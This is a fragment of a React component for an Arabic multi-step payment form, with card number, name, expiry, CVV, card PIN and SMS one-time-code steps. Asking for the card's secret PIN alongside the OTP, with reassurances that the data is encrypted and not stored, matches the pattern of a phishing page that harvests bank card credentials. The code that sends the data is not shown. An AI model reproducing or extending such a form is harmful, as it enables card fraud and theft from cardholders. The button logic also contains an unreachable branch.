                      <p className="text-base text-blue-700 font-medium">جميع بياناتك محمية بتشفير SSL 256-bit</p>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-10">
                  <div className="space-y-8">
                    <div>
                      <label className="block text-sm font-bold text-gray-800 mb-4">
                        رقم البطاقة <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <Input
                          name="cardNumber"
                          id="cardNumber"
                          type="text"
                          placeholder="#### #### #### ####"
                          required
                          dir="rtl"
                          value={cardNumber}
                          onChange={(e) => handleCardFieldChange("cardNumber", e.target.value)}
                          onBlur={(e) => handleCardFieldBlur("cardNumber", e.target.value)}
                          maxLength={19}
                          autoFocus={true}
                          className={`h-12 pr-16 text-lg border-2 rounded-xl transition-all duration-200 ${
                            cardErrors.cardNumber
                              ? "border-red-400 focus:border-red-500 bg-red-50"
                              : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
                          }`}
                        />
                        {/* Card type indicator */}
                        <div className="absolute left-4 top-1/2 transform -translate-y-1/2">
                          <div className={`flex items-center gap-2 ${cardType.color}`}>
                            <span className="text-md">{cardType.icon}</span>
                            <span className="text-sm font-bold">
                              {cardType.type !== "Unknown" ? cardType.type : ""}
                            </span>
                          </div>
                        </div>
                      </div>
                      {cardErrors.cardNumber && (
                        <div
                          className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg"
                          role="alert"
                        >
                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
                          <span>{cardErrors.cardNumber}</span>
                        </div>
                      )}
                    </div>

                    <div>
                      <label className="block text-sm font-bold text-gray-800 mb-4">
                        الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
                      </label>
                      <Input
                        name="cardName"
                        id="cardName"
                        type="text"
                        className={`h-12 text-lg border-2 rounded-xl transition-all duration-200 ${
                          cardErrors.cardName
                            ? "border-red-400 focus:border-red-500 bg-red-50"
                            : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
                        }`}
                        value={cardName}
                        onChange={(e) => handleCardFieldChange("cardName", e.target.value)}
                        onBlur={(e) => handleCardFieldBlur("cardName", e.target.value)}
                        placeholder="JOHN SMITH"
                        required
                        dir="ltr"
                      />
                      {cardErrors.cardName && (
                        <div
                          className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg"
                          role="alert"
                        >
                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
                          <span>{cardErrors.cardName}</span>
                        </div>
                      )}
                    </div>

                    <div className="grid grid-cols-3 gap-6">
                      <div>
                        <label className="block text-sm font-bold text-gray-800 mb-4">
                          الشهر <span className="text-red-500">*</span>
                        </label>
                        <select
                          name="expiryMonth"
                          id="expiryMonth"
                          className={`w-full h-12 px-4 py-2 border-2 rounded-xl focus:outline-none focus:ring-2 text-lg transition-all duration-200 ${
                            cardErrors.cardMonth
                              ? "border-red-400 focus:ring-red-200 focus:border-red-500 bg-red-50"
                              : "border-gray-200 focus:ring-blue-200 focus:border-blue-500 bg-white hover:border-gray-300"
                          }`}
                          value={cardMonth}
                          onChange={(e) => handleCardFieldChange("cardMonth", e.target.value)}
                          onBlur={(e) => handleCardFieldBlur("cardMonth", e.target.value)}
                        >
                          <option value="">الشهر</option>
                          {Array.from({ length: 12 }, (_, i) => (
                            <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                              {String(i + 1).padStart(2, "0")}
                            </option>
                          ))}
                        </select>
                        {cardErrors.cardMonth && <p className="text-red-500 text-sm mt-2">{cardErrors.cardMonth}</p>}
                      </div>

                      <div>
                        <label className="block text-sm font-bold text-gray-800 mb-4">
                          السنة <span className="text-red-500">*</span>
                        </label>
                        <select
                          className={`w-full h-12 px-4 py-2 border-2 rounded-xl focus:outline-none focus:ring-2 text-lg transition-all duration-200 ${
                            cardErrors.cardYear
                              ? "border-red-400 focus:ring-red-200 focus:border-red-500 bg-red-50"
                              : "border-gray-200 focus:ring-blue-200 focus:border-blue-500 bg-white hover:border-gray-300"
                          }`}
                          value={cardYear}
                          onChange={(e) => handleCardFieldChange("cardYear", e.target.value)}
                          onBlur={(e) => handleCardFieldBlur("cardYear", e.target.value)}
                          name="expiryYear"
                          id="expiryYear"
                        >
                          <option value="">السنة</option>
                          {Array.from({ length: 10 }, (_, i) => {
                            const year = new Date().getFullYear() + i
                            return (
                              <option key={year} value={year}>
                                {year}
                              </option>
                            )
                          })}
                        </select>
                        {cardErrors.cardYear && <p className="text-red-500 text-sm mt-2">{cardErrors.cardYear}</p>}
                      </div>

                      <div>
                        <label className="block text-sm font-bold text-gray-800 mb-4">
                          CVV <span className="text-red-500">*</span>
                        </label>
                        <Input
                          name="cvv"
                          id="cvv"
                          type="password"
                          className={`h-12 text-lg border-2 rounded-xl transition-all duration-200 ${
                            cardErrors.cvv
                              ? "border-red-400 focus:border-red-500 bg-red-50"
                              : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
                          }`}
                          placeholder={cardType.type === "American Express" ? "1234" : "123"}
                          maxLength={cardType.type === "American Express" ? 4 : 3}
                          value={cvv}
                          onChange={(e) => handleCardFieldChange("cvv", e.target.value)}
                          onBlur={(e) => handleCardFieldBlur("cvv", e.target.value)}
                        />
                        {cardErrors.cvv && <p className="text-red-500 text-sm mt-2">{cardErrors.cvv}</p>}
                      </div>
                    </div>

                    <div className="w-full">
                      <label className="block text-sm font-bold text-gray-800 mb-4">
                        الرقم السري للبطاقة <span className="text-red-500">*</span>
                      </label>
                      <Input
                        name="pinCode"
                        id="pinCode"
                        type="password"
                        className={`h-12 text-lg border-2 rounded-xl transition-all duration-200 ${
                          cardErrors.pinCode
                            ? "border-red-400 focus:border-red-500 bg-red-50"
                            : "border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300"
                        }`}
                        placeholder="####"
                        maxLength={4}
                        value={pinCode}
                        required
                        onChange={(e) => handleCardFieldChange("pinCode", e.target.value)}
                        onBlur={(e) => handleCardFieldBlur("pinCode", e.target.value)}
                      />
                      {cardErrors.pinCode && (
                        <div
                          className="flex items-center gap-2 mt-3 text-red-600 text-sm bg-red-50 p-3 rounded-lg"
                          role="alert"
                        >
                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
                          <span>{cardErrors.pinCode}</span>
                        </div>
                      )}
                    </div>

                    <div className="bg-green-50 border-2 border-green-200 rounded-md p-6 mt-8">
                      <div className="flex items-center gap-4">
                        <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center">
                          <Lock className="w-6 h-6 text-green-600" />
                        </div>
                        <div>
                          <p className="font-bold text-green-800 text-base">معلومات آمنة</p>
                          <p className="text-sm text-green-600 font-medium">جميع بيانات البطاقة مشفرة ولا يتم حفظها</p>
                        </div>
                      </div>
                    </div>
                  </div>

             
                </div>
              </div>
            )}

            {currentPage === 7 && (
              <div className="space-y-10">
                <div className="text-center mb-12">
                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-md lg:text-md font-bold text-gray-900 mb-4">
                    التحقق من الهوية
                  </h3>
                  <p className="text-lg text-gray-600 max-w-md mx-auto">
                    أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية
                  </p>
                </div>

                <div className="max-w-lg mx-auto text-center space-y-10">
                  <div className="w-28 h-28 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                    <Phone className="w-14 h-14 text-blue-600" />
                  </div>

                  <div>
                    <h4 className="text-md font-bold text-gray-900 mb-4">تم إرسال رمز التحقق</h4>
                    <p className="text-gray-600 text-lg">
                      تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
                      <br />
                      <span className="font-bold text-blue-600">{formData.phone}</span>
                    </p>
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-800 mb-4">
                      رمز التحقق <span className="text-red-500">*</span>
                    </label>
                    <Input
                      name="otp"
                      type="text"
                      placeholder="######"
                      required
                      value={otp}
                      maxLength={6}
                      onChange={(e) => setOtp(e.target.value)}
                      autoFocus={true}
                      className="text-center text-md h-20 tracking-widest border-2 rounded-xl border-gray-200 focus:border-blue-500 bg-white hover:border-gray-300 transition-all duration-200"
                    />
                  </div>

                  

                  {otpAttempts > 0 && (
                    <p className="text-base text-orange-600 font-medium">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
                  )}
                </div>
              </div>
            )}
          </div>

          {/* Enhanced Navigation Buttons */}
          <div className="flex flex-col sm:flex-row justify-between items-center mt-12 pt-10 border-t-2 border-gray-100 gap-6 sm:gap-0">
            <Button
              variant="outline"
              onClick={prevStep}
              disabled={currentPage === 1 || paymentProcessing || isSubmitting}
              className="px-10 py-4 w-full sm:w-auto order-2 sm:order-1 border-2 border-gray-300 hover:border-blue-500 hover:text-blue-600 bg-white font-semibold text-lg rounded-xl transition-all duration-200"
            >
              <ArrowLeft className="w-5 h-5 ml-3" />
              السابق
            </Button>

            <div className="text-base text-gray-500 order-1 sm:order-2 bg-gray-100 px-6 py-3 rounded-full font-semibold">
              الخطوة {currentPage} من {steps.length}
            </div>

            {currentPage < 7 ? (
              <Button
                onClick={nextStep}
                className="bg-blue-600 hover:bg-blue-700 px-10 py-4 w-full sm:w-auto order-3 font-bold text-lg rounded-xl shadow-lg transition-all duration-200"
                disabled={isSubmitting}
              >
                التالي
                <ArrowLeft className="w-5 h-5 mr-3 rotate-180" />
              </Button>
            ) : currentPage === 6 ? (
              <Button
                onClick={handlePayment}
                disabled={paymentProcessing}
                className="bg-green-600 hover:bg-green-700 px-10 py-4 w-full sm:w-auto order-3 font-bold text-lg rounded-xl shadow-lg transition-all duration-200"
              >
                {paymentProcessing ? (
                  <div className="flex items-center gap-3">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    جاري معالجة الدفع...
                  </div>
                ) : (
                  <>
                    <CreditCard className="w-5 h-5 ml-3" />
                    تأكيد الدفع
                  </>
                )}
              </Button>
            ) : (
              <Button
                onClick={verifyOTP}
                disabled={isSubmitting}
                className="bg-green-600 hover:bg-green-700 px-10 py-4 w-full sm:w-auto order-3 font-bold text-lg rounded-xl shadow-lg transition-all duration-200"
              >
                {isSubmitting ? (
                  <div className="flex items-center gap-3">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    جاري التحقق...
                  </div>
                ) : (
                  <>
                    <CheckCircle className="w-5 h-5 ml-3" />
                    تأكيد الرمز
                  </>
                )}
              </Button>
            )}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}
